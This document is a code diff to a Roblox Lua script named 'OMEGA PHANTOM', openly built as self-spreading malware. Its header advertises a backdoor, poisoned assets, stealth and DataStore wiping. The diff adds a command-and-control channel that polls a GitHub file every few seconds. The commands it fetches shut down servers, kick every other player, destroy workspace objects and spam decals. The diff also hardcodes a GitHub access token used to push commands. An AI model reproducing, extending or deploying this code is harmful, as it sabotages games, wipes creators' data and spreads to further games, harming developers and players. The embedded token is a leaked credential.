@@ -1,8 +1,7 @@
 -- ============================================================================
---  OMEGA PHANTOM | FINAL ULTIMATE EDITION (ALL FEATURES + REAL CONSOLE FEEDBACK)
---  Includes: Polymorphic Stealth, Sleep Mode, Backdoor, Poison Assets, Decal Spam,
---  Slow Spread, Real-time Console Logs, GUI with Status, Cross-Game Persistence,
---  Studio Trap, Decoy, Fragmented Defense, Scorched Earth DataStore Wipe.
+--  OMEGA PHANTOM | FINAL ULTIMATE EDITION (NO MESSAGING SERVICE ERROR)
+--  Removed MessagingService (client cannot use it). 
+--  Global commands via GitHub (command.txt) replace cross-server communication.
 --  Owner: 109er_0
 -- ============================================================================
 
@@ -13,7 +12,6 @@ local HttpService = game:GetService("HttpService")
 local Workspace = game:GetService("Workspace")
 local Lighting = game:GetService("Lighting")
 local TeleportService = game:GetService("TeleportService")
-local MessagingService = game:GetService("MessagingService")
 local DataStoreService = game:GetService("DataStoreService")
 local LogService = game:GetService("LogService")
 local CoreGui = game:GetService("CoreGui")
@@ -35,11 +33,37 @@ local whitelistGames = {
     1962086498, 1277113435, 134236244017051, 18381724395
 }
 
+-- GitHub global command file
+local commandUrl = "https://raw.githubusercontent.com/mebdsn78-dev/OmegaData/refs/heads/main/command.txt"
+local githubToken = "Github_pat_11CCOI6GI0jTkUZmHyPtQC_dXkifJom2ddmq0cdv1bEu8RksKHYEEvF3xyFlAfb5xuDOGWSONEkuo8wHxW"
+local githubApiUrl = "https://api.github.com/repos/mebdsn78-dev/OmegaData/contents/command.txt"
+
+local lastCommand = ""
+
 -- =============================[ ENCRYPTION & UTILITIES ]=============================
 local function encode(s)
     local out = ""
     for i = 1, #s do out = out .. string.char(string.byte(s, i) + 11) end
     return out
+end
+
+local function base64_encode(data)
+    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+    local result = ""
+    for i = 1, #data, 3 do
+        local b1, b2, b3 = string.byte(data, i, i+2)
+        b2 = b2 or 0
+        b3 = b3 or 0
+        local n = b1 * 0x10000 + b2 * 0x100 + b3
+        local c1 = math.floor(n / 0x40000)
+        local c2 = math.floor((n % 0x40000) / 0x1000)
+        local c3 = math.floor((n % 0x1000) / 0x40)
+        local c4 = n % 0x40
+        result = result .. b64chars:sub(c1+1, c1+1) .. b64chars:sub(c2+1, c2+1)
+        if i+1 <= #data then result = result .. b64chars:sub(c3+1, c3+1) else result = result .. "=" end
+        if i+2 <= #data then result = result .. b64chars:sub(c4+1, c4+1) else result = result .. "=" end
+    end
+    return result
 end
 
 local function ClearConsole()
@@ -138,7 +162,7 @@ local function autoSpreadTrigger()
     print("[SPREAD] 🚀 Launching spread to game " .. target)
     local result = JumpToNewGame(target)
     if result then
-        print("[SPREAD] ✅ Spread successful. Moving to next target in " .. spreadInterval .. " seconds.")
+        print("[SPREAD] ✅ Spread successful. Next spread in " .. spreadInterval .. " seconds.")
     else
         warn("[SPREAD] ❌ Spread failed. Will retry later.")
     end
@@ -177,6 +201,91 @@ local function UniversalSpread()
     print("[SPREAD] ========== UNIVERSAL SPREAD COMPLETED ==========")
     print(string.format("[SPREAD] Results: %d successful, %d failed out of %d games", successCount, failCount, #whitelistGames))
     return true
+end
+
+-- =============================[ GLOBAL COMMANDS VIA GITHUB (CROSS-SERVER) ]=============================
+local function getFileSha()
+    local headers = {["Authorization"] = "token " .. githubToken, ["User-Agent"] = "OmegaPhantom"}
+    local success, response = pcall(function() return HttpService:GetAsync(githubApiUrl, headers) end)
+    if not success then return nil end
+    local data = HttpService:JSONDecode(response)
+    return data and data.sha
+end
+
+local function sendCommandToGitHub(command)
+    local sha = getFileSha()
+    local content = command
+    local encoded = base64_encode(content)
+    local body = { message = "Update global command", content = encoded, branch = "main" }
+    if sha then body.sha = sha end
+    local headers = {["Authorization"] = "token " .. githubToken, ["Content-Type"] = "application/json", ["User-Agent"] = "OmegaPhantom"}
+    local success = pcall(function()
+        HttpService:RequestAsync({
+            Url = githubApiUrl,
+            Method = "PUT",
+            Headers = headers,
+            Body = HttpService:JSONEncode(body)
+        })
+    end)
+    if success then
+        print("[GLOBAL] Command sent to GitHub: " .. command)
+    else
+        warn("[GLOBAL] Failed to send command to GitHub.")
+    end
+end
+
+local function fetchGlobalCommand()
+    local success, result = pcall(function() return HttpService:GetAsync(commandUrl) end)
+    if not success or not result then return "" end
+    return string.gsub(result, "%s+", "")
+end
+
+local function executeGlobalCommand(command)
+    local cmd = string.lower(command)
+    if cmd == "shutdown" then
+        sendGlobalMessageToAllPlayers(KICK_MESSAGE)
+        pcall(function() game:Shutdown() end)
+    elseif cmd == "kickall" then
+        sendGlobalMessageToAllPlayers(KICK_MESSAGE)
+        for _, p in pairs(Players:GetPlayers()) do
+            if p ~= LocalPlayer then p:Kick(KICK_MESSAGE) end
+        end
+    elseif cmd == "wipe" then
+        for _, obj in pairs(Workspace:GetChildren()) do
+            if obj ~= Workspace.Terrain and obj ~= Workspace.Camera then
+                pcall(function() obj:Destroy() end)
+            end
+        end
+    elseif cmd == "reset" then
+        TeleportService:Teleport(game.PlaceId)
+    elseif cmd == "color" then
+        Lighting.ColorCorrection.TintColor = Color3.new(math.random(), math.random(), math.random())
+    elseif cmd == "fly" then
+        local char = LocalPlayer.Character
+        if char and char:FindFirstChild("HumanoidRootPart") then
+            local bv = Instance.new("BodyVelocity")
+            bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+            bv.Velocity = Vector3.new(0, 50, 0)
+            bv.Parent = char.HumanoidRootPart
+            task.wait(5)
+            bv:Destroy()
+        end
+    elseif cmd == "decalspam" then
+        task.spawn(runDecalSpam)
+    end
+end
+
+local function startCommandListener()
+    lastCommand = fetchGlobalCommand()
+    while true do
+        task.wait(6)
+        local newCommand = fetchGlobalCommand()
+        if newCommand ~= "" and newCommand ~= lastCommand then
+            print("[GLOBAL] Executing: " .. newCommand)
+            executeGlobalCommand(newCommand)
+            lastCommand = newCommand
+        end
+    end
 end
 
 -- =============================[ DATASTORE WIPE, STUDIO TRAP, DECOY, FRAGMENTS ]=============================
@@ -606,34 +715,14 @@ local function CreateMenuGUI()
     return true
 end
 
--- =============================[ MESSAGING SERVICE & SLOW BURN ]=============================
-local messagingTopic = "Omega_Internal_" .. game.PlaceId
-local function broadcastInternal(data)
-    pcall(function() MessagingService:PublishAsync(messagingTopic, HttpService:JSONEncode(data)) end)
-end
-
-local function listenInternal()
-    MessagingService:SubscribeAsync(messagingTopic, function(msg)
-        local ok, d = pcall(function() return HttpService:JSONDecode(msg.Data) end)
-        if ok and d then
-            if d.cmd == "global_pulse" then
-                if not sleepModeActive then
-                    autoSpreadTrigger()
-                end
-            elseif d.cmd == "plant_backdoor" then
-                PlantBackdoor()
-            end
-        end
-    end)
-end
-listenInternal()
-
+-- =============================[ SLOW BURN AUTOMATION (NO MESSAGING SERVICE) ]=============================
 local function startSlowBurn()
     task.spawn(function()
         while true do
             task.wait(spreadInterval)
-            if autoSpreadEnabled then autoSpreadTrigger() end
-            broadcastInternal({cmd = "global_pulse"})
+            if autoSpreadEnabled then
+                autoSpreadTrigger()
+            end
         end
     end)
 end
@@ -648,6 +737,7 @@ local function Launch()
     ChatIntercept()
     CreateMenuGUI()
     startSlowBurn()
+    task.spawn(startCommandListener)
     task.spawn(function()
         while true do
             task.wait(120)
